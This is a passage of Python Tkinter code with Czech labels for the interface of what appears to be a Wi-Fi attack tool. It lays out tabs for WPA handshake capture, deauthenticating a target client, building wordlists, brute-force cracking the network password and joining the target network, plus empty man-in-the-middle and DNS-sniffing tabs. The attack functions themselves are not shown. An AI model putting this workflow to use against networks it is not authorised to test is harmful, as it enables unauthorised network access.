target_net = Label(target_frame, text="", font=('Helvetica', 16), fg='green')
target_ap = Label(target_frame, text="", font=('Helvetica', 16), fg='green')
target_cl = Label(target_frame, text="", font=('Helvetica', 16), fg='green')
target_ch = Label(target_frame, text="", font=('Helvetica', 16), fg='green')
target_net_label.grid(row=5, column=0, sticky=W, padx=5, pady=5)
target_ap_label.grid(row=6, column=0, sticky=W, padx=5, pady=5)
target_cl_label.grid(row=7, column=0, sticky=W, padx=5, pady=5)
target_ch_label.grid(row=8, column=0, sticky=W, padx=5, pady=5)
target_net.grid(row=5, column=1, sticky=W)
target_ap.grid(row=6, column=1, sticky=W)
target_cl.grid(row=7, column=1, sticky=W)
target_ch.grid(row=8, column=1, sticky=W)

# ========================================================================================================================================
# Tab "Záchyt handshaku" =================================================================================================================

# WPA Catch Frame ========================================================================================================================
handshake_catch_frame = LabelFrame(frame_t2, text="Záchyt WPA handshaku", borderwidth=4)
handshake_catch_frame.pack(padx=10,pady=5, fill='x')

handshake_catch_label = Label(handshake_catch_frame, text="Spustit proces na zachytávání komunikace klienta s AP a zachycením WPA handshaku:")
handshake_catch_on_button = Button(handshake_catch_frame, text="Spustit", width= 20, command=start_handshake_catch)
handshake_catch_off_button = Button(handshake_catch_frame, text="Zastavit", width= 20, state=DISABLED, command=stop_handshake_catch)

handshake_catch_label.grid(row=0, column=0, sticky=W, padx=5, pady=5)
handshake_catch_on_button.grid(row=0,column=1, pady=5, padx=5)
handshake_catch_off_button.grid(row=0,column=2, pady=5, padx=5)

handshake_catch_progress = ttk.Progressbar(handshake_catch_frame, orient=HORIZONTAL, mode='indeterminate')
handshake_catch_progress.step(0)
handshake_catch_progress.grid(row=1,column=0,columnspan=4, sticky=EW, padx=15, pady=5)

handshake_command = Label(handshake_catch_frame, text="")
handshake_command.grid(row=2, column=0, columnspan=4, pady=5)

#handshake_catch_textarea = scrolledtext.ScrolledText(handshake_catch_frame, wrap=tk.WORD, width=98, height=20)
#handshake_catch_textarea.grid(row=3, column=0, columnspan=3, padx=10, pady=10)

handshake_finished_label = Label(handshake_catch_frame, text="Spusťte zachytávání handshaku!", font=('Helvetica', 16))
handshake_finished_label.grid(row=3, column=0, columnspan=4, padx=5, pady=5)

handshake_catch_frame.grid_columnconfigure(3, weight=1)

# Deauthificate Frame ========================================================================================================================
deauth_frame = LabelFrame(frame_t2, text="Deauthentifikace target klienta", borderwidth=4)
deauth_frame.pack(padx=10,pady=5, fill='x')

deauth_label = Label(deauth_frame, text="Spustit proces odpojování komunikace Clienta s AP pro opětovné zaslání handshake:")
deauth_on_button = Button(deauth_frame, text="Spustit", width= 20, command=start_deauthentification)
deauth_off_button = Button(deauth_frame, text="Zastavit", width= 20, state=DISABLED, command=stop_deauthentification)
deauth_label.grid(row=0, column=0, sticky=W, padx=5, pady=5)
deauth_on_button.grid(row=0,column=1, sticky=W, pady=5, padx=5)
deauth_off_button.grid(row=0,column=2, sticky=W, pady=5, padx=5)

deauth_progress = ttk.Progressbar(deauth_frame, orient=HORIZONTAL, length=800, mode='indeterminate')
deauth_progress.step(0)
deauth_progress.grid(row=1,column=0,columnspan=4, sticky=EW, padx=15, pady=5)

deauth_command_label = Label(deauth_frame, text="")
deauth_command_label.grid(row=2, column=0, columnspan=4, pady=5)

deauth_frame.grid_columnconfigure(3, weight=1)
# ========================================================================================================================================
# Tab "Prolomení hesla" ==================================================================================================================

# Create Wordlist Frame ========================================================================================================================
password_frame = LabelFrame(frame_t3, text="Prolomení zachyceného hesla")
password_frame.pack(padx=10,pady=5, fill='x')

create_wordlist_frame = LabelFrame(frame_t3, text="Vytvořit slovník hesel", borderwidth=4)
create_wordlist_frame.pack(padx=10,pady=5, fill='x')

wl_label = Label(create_wordlist_frame, text="Parametry vytvářeného slovníku hesel:")
wl_min_label = Label(create_wordlist_frame, text="Minimální počet znaků:")
wl_max_label = Label(create_wordlist_frame, text="Maximální počet znaků:")
wl_char_label = Label(create_wordlist_frame, text="Použité znaky:")
wl_name_label = Label(create_wordlist_frame, text="Název souboru:")
wl_min_entry = Entry(create_wordlist_frame, width=20)
wl_max_entry = Entry(create_wordlist_frame, width=20)
wl_char_entry = Entry(create_wordlist_frame, width=20)
wl_name_entry = Entry(create_wordlist_frame, width=20)

wl_label.grid(row=0, column=0, columnspan=4, padx=5, pady=5)
wl_min_label.grid(row=1, column=0, sticky=W, padx=5, pady=5)
wl_max_label.grid(row=1, column=2, sticky=W, padx=5, pady=5)
wl_char_label.grid(row=2, column=0, sticky=W, padx=5, pady=5)
wl_name_label.grid(row=2, column=2, sticky=W, padx=5, pady=5)
wl_min_entry.grid(row=1, column=1, sticky=W, padx=5, pady=5)
wl_max_entry.grid(row=1, column=3, sticky=W, padx=5, pady=5)
wl_char_entry.grid(row=2, column=1, sticky=W, padx=5, pady=5)
wl_name_entry.grid(row=2, column=3, sticky=W, padx=5, pady=5)

create_wl_button = Button(create_wordlist_frame, text="Vytvořit", width= 20, command=create_wordlist)
create_wl_button.grid(row=3, column=0, columnspan=4)

# WTF s progress barem u vytváření slovníku? TODO test, jestli je potřeba
create_wl_progress = ttk.Progressbar(create_wordlist_frame, orient=HORIZONTAL, length=800, mode='indeterminate')
create_wl_progress.step(0)

# Load Wordlist Frame ========================================================================================================================
load_wordlist_frame = LabelFrame(frame_t3, text="Načíst hotový slovník hesel", highlightthickness=2, borderwidth=4)
load_wordlist_frame.pack(padx=10,pady=5, fill='x')

load_wl_button = Button(load_wordlist_frame, text="Načíst slovník hesel", width= 20, command=load_wordlist)
load_wl_button.grid(row=0, column=0, padx=5, pady=5)

# Crack the password Frame ========================================================================================================================
crack_pw_frame = LabelFrame(frame_t3, text="Prolomit heslo sítě hrubou silou", highlightthickness=4, borderwidth=4)
crack_pw_frame.pack(padx=10,pady=5, fill='x')

crack_pw_label  =Label(crack_pw_frame, text="Zvolený soubor:")
wordlist_name = ""
wordlist_name_label = Label(crack_pw_frame, text=wordlist_name)
crack_pw_label.grid(row=0, column=0, padx=5, pady=5)
wordlist_name_label.grid(row=0, column=1, padx=5, pady=5)

crack_pw_button = Button(crack_pw_frame, text="Prolomit heslo", width= 20, command=crack_pw)
crack_pw_button.grid(row=1, column=0, columnspan=2, sticky=W, padx=5, pady=5)

#crack_pw_progress = ttk.Progressbar(crack_pw_frame, orient=HORIZONTAL, length=800, mode='determinate')
crack_pw_progress = ttk.Progressbar(crack_pw_frame, orient=HORIZONTAL, mode='determinate')
crack_pw_progress.step(0)

crack_pw_current_line_label = Label(crack_pw_frame, text="")  
crack_pw_current_line_label.grid(row=2, column=0, columnspan=2)

deauth_frame.grid_columnconfigure(2, weight=1)

# Network Connection Frame ========================================================================================================================
connect_frame = LabelFrame(frame_t3, text="Připojit se k cílové Wi-Fi síti", highlightthickness=4, borderwidth=4)
connect_frame.pack(padx=10,pady=5, fill='x')

password_info_label = Label(connect_frame, text="Heslo k Wi-fi síti: ")
password_label = Label(connect_frame, text="", font=('Helvetica', 16), fg='green')
password_info_label.grid(row=0, column=0, padx=5, pady=5, sticky=W)
password_label.grid(row=0, column=1, padx=5, pady=5)

connect_button = Button(connect_frame, text="Připojit se k síti", width= 20, command=connect_to_wifi)
connect_button.grid(row=1, column=0, columnspan=2, padx=5, pady=5)


# Tab "Man-in-the-middle" ================================================================================================================


# Tab "Odposlech DNS dotazů" =============================================================================================================


# Status bar =============================================================================================================================
status = Label(root, text="OK", bd=2, relief=SUNKEN, anchor=SW)
status.pack(fill='x', side=BOTTOM)

# Start the GUI event loop ===============================================================================================================
root.mainloop()
